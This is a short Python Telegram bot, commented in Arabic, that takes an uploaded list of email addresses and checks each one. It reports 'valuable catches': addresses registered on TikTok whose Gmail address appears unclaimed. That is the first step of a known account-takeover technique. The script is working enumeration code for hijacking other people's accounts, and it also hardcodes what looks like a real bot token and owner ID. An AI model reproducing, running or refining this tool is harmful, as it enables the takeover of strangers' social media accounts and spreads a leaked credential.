import telebot
import requests
import time

# --- بياناتك الشخصية ---
TOKEN = "7979323842:AAFB_LAZI1wN5462k-AgMaSkw5YgplJBARw"
ID = 7755049597

bot = telebot.TeleBot(TOKEN)

def check_logic(email):
    try:
        # فحص تيك توك
        tk_res = requests.get(f"https://www.tiktok.com/api/v1/auth/check-email/?email={email}", timeout=10).text
        if "existing" in tk_res:
            # فحص جيميل
            gm_res = requests.get(f"https://mail.google.com/mail/gxlu?email={email}", timeout=10)
            if "COMPASS" not in gm_res.headers.get('Set-Cookie', ''):
                return True
        return False
    except: return False

@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id == ID:
        bot.reply_to(message, "🚀 البوت السحابي يعمل الآن 24/7!\nأرسل ملف .txt لبدء الصيد.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.chat.id != ID: return
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    with open("list.txt", 'wb') as f: f.write(downloaded_file)
    bot.send_message(ID, "✅ تم استلام القائمة.. بدأ الفحص السحابي.")
    
    with open("list.txt", 'r') as f:
        emails = f.read().splitlines()

    for email in emails:
        if check_logic(email):
            bot.send_message(ID, f"🎯 صيد ثمين: {email}")
        time.sleep(0.5)

bot.polling(none_stop=True)
  
